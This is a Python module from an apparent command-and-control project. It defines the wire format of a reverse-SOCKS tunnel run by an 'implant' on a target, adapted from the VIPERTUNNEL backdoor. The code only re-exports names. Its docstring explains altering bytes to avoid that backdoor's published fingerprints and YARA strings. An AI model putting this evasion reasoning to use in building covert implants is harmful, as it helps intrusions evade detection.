"""The tunnel's wire format: framing, command messages and SOCKS5.

**Every name in this module is implemented in `software/c2/beacon.py` and
re-exported from here.** That is deliberate, and it is not a layering
choice: `api_beacon_gen` builds the artifact the tunnel endpoint runs from
by reading exactly that one file, so a codec defined in this module would
pass every test in this repository and be absent at runtime on target.
The implementation therefore lives where it can be delivered, and this
module is the name the server side imports — so that both ends of the
tunnel are provably running the same encoder and the same decoder. There
is no second copy here, and there must never be one.

This protocol is derived from VIPERTUNNEL, the Python reverse-SOCKS
backdoor InfoGuard Labs documented in *Slithering Through the Noise*
(2026-04-09). It keeps that protocol's shape — one command channel, a
SOCKS5-shaped exchange per relay in which the implant is the server — and
replaces its bytes. Four of the replacements will read as bugs to a
reader who knows the original, and are not:

| Field | VIPERTUNNEL | Here |
|---|---|---|
| SOCKS version byte | stripped from greeting, request and reply | restored, `0x05`, and checked on decode |
| `RSV` | absent | present, `0x00`, and checked on decode |
| Ports | **little-endian** | **big-endian**, per RFC 1928 §4 |
| Success status | `1`, with `0` for failure | **`0`**, per RFC 1928 §6 |
| `ATYP=4` (IPv6) | refused | supported |
| Keep-alive | a zero `uint16` — the `00 00` that got its infrastructure enumerated | `MSG_PING` / `MSG_PONG` |

The frame length prefix is `>H`, big-endian, for the same reason the ports
are and not because the framing needs it either way: the original's
little-endian numbers are a published, scannable trait, and a fingerprint
we do not need is one we do not keep. For the same reason an empty frame —
which is the bytes `00 00` exactly — is refused by both `write_frame` and
`read_frame` rather than merely left unused.

The wire, outermost first:

    frame           = ">H" length + one Noise message
    command message = kind(1) + compact JSON object        (inside Noise)
    SOCKS request   = ver(1)=5 cmd(1) rsv(1)=0 atyp(1) addr port(">H")
    SOCKS reply     = ver(1)=5 rep(1) rsv(1)=0 atyp(1) addr port(">H")

Bodies are compact JSON with sorted keys, because this channel carries a
handful of messages an hour and reading a capture of our own test rig is
worth more than the bytes.

The two size ceilings are both aliases of `NoiseSession`'s own, so there
is one number for each and not a second that can go stale:
`MAX_FRAME_LEN` is 65535, the largest Noise message and exactly what a
`>H` prefix can express, and `MAX_PAYLOAD_LEN` is 65519, that less the
16-byte GCM tag — the plaintext ceiling the design plan calls
`MAX_PAYLOAD`.

Two deliberate absences. **The SOCKS greeting and the RFC 1929
username/password sub-negotiation are not here** — only the
operator-facing proxy performs those, the implant never does, and the
inherited credentials are themselves published YARA strings. And `BIND`
and `UDP ASSOCIATE` are not supported but do decode, so that a peer asking
for one can be refused with `REPLY_COMMAND_NOT_SUPPORTED` instead of a
parse error it cannot tell from a dead tunnel; ask
`socks_command_supported` before acting on a decoded command.
"""

from ..beacon import (                                      # noqa: F401
    ATYP_DOMAIN,
    ATYP_IPV4,
    ATYP_IPV6,
    CMD_BIND,
    CMD_CONNECT,
    CMD_UDP_ASSOCIATE,
    FRAME_PREFIX_LEN,
    MAX_FRAME_LEN,
    MAX_PAYLOAD_LEN,
    MESSAGE_KIND_NAMES,
    MESSAGE_KINDS,
    MSG_CLOSE,
    MSG_HELLO,
    MSG_OPEN_RELAY,
    MSG_PING,
    MSG_PONG,
    MSG_RELAY,
    REPLY_ADDRESS_TYPE_NOT_SUPPORTED,
    REPLY_COMMAND_NOT_SUPPORTED,
    REPLY_CONNECTION_REFUSED,
    REPLY_GENERAL_FAILURE,
    REPLY_HOST_UNREACHABLE,
    REPLY_NETWORK_UNREACHABLE,
    REPLY_NOT_ALLOWED,
    REPLY_SUCCEEDED,
    REPLY_TTL_EXPIRED,
    SOCKS_ADDRESS_TYPE_NAMES,
    SOCKS_COMMAND_NAMES,
    SOCKS_REPLY_NAMES,
    SOCKS_VERSION,
    SUPPORTED_COMMANDS,
    NoiseSession,
    decode_message,
    decode_socks_reply,
    decode_socks_request,
    encode_message,
    encode_socks_reply,
    encode_socks_request,
    read_frame,
    socks_command_supported,
    write_frame,
)

__all__ = [
    "ATYP_DOMAIN",
    "ATYP_IPV4",
    "ATYP_IPV6",
    "CMD_BIND",
    "CMD_CONNECT",
    "CMD_UDP_ASSOCIATE",
    "FRAME_PREFIX_LEN",
    "MAX_FRAME_LEN",
    "MAX_PAYLOAD_LEN",
    "MESSAGE_KINDS",
    "MESSAGE_KIND_NAMES",
    "MSG_CLOSE",
    "MSG_HELLO",
    "MSG_OPEN_RELAY",
    "MSG_PING",
    "MSG_PONG",
    "MSG_RELAY",
    "NoiseSession",
    "REPLY_ADDRESS_TYPE_NOT_SUPPORTED",
    "REPLY_COMMAND_NOT_SUPPORTED",
    "REPLY_CONNECTION_REFUSED",
    "REPLY_GENERAL_FAILURE",
    "REPLY_HOST_UNREACHABLE",
    "REPLY_NETWORK_UNREACHABLE",
    "REPLY_NOT_ALLOWED",
    "REPLY_SUCCEEDED",
    "REPLY_TTL_EXPIRED",
    "SOCKS_ADDRESS_TYPE_NAMES",
    "SOCKS_COMMAND_NAMES",
    "SOCKS_REPLY_NAMES",
    "SOCKS_VERSION",
    "SUPPORTED_COMMANDS",
    "decode_message",
    "decode_socks_reply",
    "decode_socks_request",
    "encode_message",
    "encode_socks_reply",
    "encode_socks_request",
    "read_frame",
    "socks_command_supported",
    "write_frame",
]
